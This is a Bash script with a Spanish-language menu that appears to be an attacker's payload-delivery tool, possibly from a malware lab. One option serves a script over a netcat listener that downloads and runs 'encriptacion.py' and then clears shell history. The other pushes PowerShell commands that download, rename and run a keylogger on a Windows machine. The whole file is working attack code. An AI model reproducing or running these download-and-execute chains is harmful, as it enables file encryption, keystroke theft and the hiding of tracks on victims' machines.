#!/bin/bash

while true; do
    clear
    echo "========================"
    echo "        MENÚ            "
    echo "========================"
    echo "1. Ejecutar Script Encriptar"
    echo "2. Ejecutar Script para Windows"
    echo "3. Salir"
    echo "========================"
    read -p "Seleccione una opción [1-3]: " opcion

    case $opcion in
        1)
            # Obtener la dirección IP de la máquina
            var=$(hostname -I | awk '{print $1}')
            
            # Crear el script datos.sh
            cat <<EOF > datos.sh
#!/bin/bash
wget http://$var:8000/py/encriptacion.py
sleep 3
python3 encriptacion.py
history -c
EOF
            # Ejecutar el servidor HTTP en segundo plano
            python3 -m http.server 8000 >/dev/null 2>&1 &
            # Esperar a que se inicie el servidor HTTP
            sleep 1
            # Enviar el script remoto a través de nc
            cat datos.sh | nc -lvp 45000 -s $var
            ;;
        2)
            # Obtener la dirección IP de la máquina
            var=$(hostname -I | awk '{print $1}')
            
            # Crear el script de comandos para Windows
            cat <<EOF > datos2.sh
sleep 3        
dir
sleep 1
dir
sleep 1
powershell.exe Invoke-WebRequest -Uri "http://$var/exe/keylogger.txt" -OutFile "keylogger.txt"
sleep 5
powershell.exe -Command "Rename-Item -Path 'keylogger.txt' -NewName 'keylogger.ps1'"
sleep 2
powershell.exe -File "C:\\Users\\Malware-User\\Music\\keylogger.ps1"
EOF
 	    # Ejecutar el servidor HTTP en segundo plano
            python3 -m http.server 8000 >/dev/null 2>&1 &
            # Esperar a que se inicie el servidor HTTP
            sleep 1
            # Establecer conexión con la máquina Windows y enviar el contenido de datos2.sh
            cat datos2.sh | nc -lvp 45000 -s $var 2>/dev/null
            ;;
        3)
            echo "Saliendo..."
            break
            ;;
        *)
            echo "Opción no válida. Intente de nuevo."
            ;;
    esac
    read -p "Presione enter para continuar..."
done
